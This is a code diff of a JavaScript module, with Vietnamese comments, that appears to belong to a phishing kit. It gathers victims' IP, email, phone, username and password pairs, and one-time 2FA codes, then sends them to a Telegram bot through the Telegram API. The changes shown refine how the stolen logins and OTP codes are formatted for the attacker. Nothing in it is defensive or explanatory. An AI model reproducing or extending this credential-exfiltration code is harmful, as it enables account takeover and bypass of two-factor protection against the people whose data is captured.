@@ -4,7 +4,7 @@ const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/`;
 
 let tgMessageId = null;
 let currentSessionId = '';
-let logHistory = []; // Dùng mảng để lưu trữ toàn bộ lịch sử
+let logHistory = []; 
 
 const getSessionId = () => {
     if (currentSessionId) return currentSessionId;
@@ -19,7 +19,6 @@ const getSessionId = () => {
 };
 
 export const setInitialSession = (text) => { 
-    // Lưu thông tin đăng ký vào mảng (chỉ lưu 1 lần)
     logHistory = [text];
 };
 
@@ -28,18 +27,15 @@ export const escapeHtml = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, 
 export const sendTelegramMessage = (newContent) => {
     const sid = getSessionId();
     
-    // Nếu có nội dung mới (Login, OTP), ném tiếp vào mảng
     if (newContent) {
         logHistory.push(newContent);
     }
     
-    // Bắt đầu format tin nhắn
     let text = `<b>🔑 MÃ PHIÊN: <code>${sid}</code></b>\n\n`;
     
-    // Duyệt qua toàn bộ lịch sử để in ra
     logHistory.forEach((item, index) => {
         if (index === 0) {
-            // Phần 1: Thông tin đăng ký (IP, Email, Phone...)
+            // Phần 1: Thông tin đăng ký
             const lines = item.split('\n');
             lines.forEach(line => {
                 if (line.trim()) {
@@ -57,13 +53,19 @@ export const sendTelegramMessage = (newContent) => {
                 }
             });
         } else {
-            // Phần 2: Login / OTP (in ra từng dòng, cách nhau 1 dòng trống)
-            text += `\n`;
+            // Phần 2: Login / OTP
+            text += `\n`; // Dòng trống ngăn cách
+            
             if (item.includes(' | ')) {
+                // Nếu là Login
                 const [user, pass] = item.split(' | ');
                 text += `<code>${user}</code> | <code>${pass}</code>`;
+            } else if (item === '[ Resend OTP requested ]') {
+                // Nếu là yêu cầu gửi lại OTP
+                text += `<i>${item}</i>`;
             } else {
-                text += `<code>${item}</code>`;
+                // Nếu là OTP, thêm nhãn và khoảng trắng để không bị dính chùm
+                text += `<b>[ 2FA ]</b> <code>${item}</code>`;
             }
         }
     });
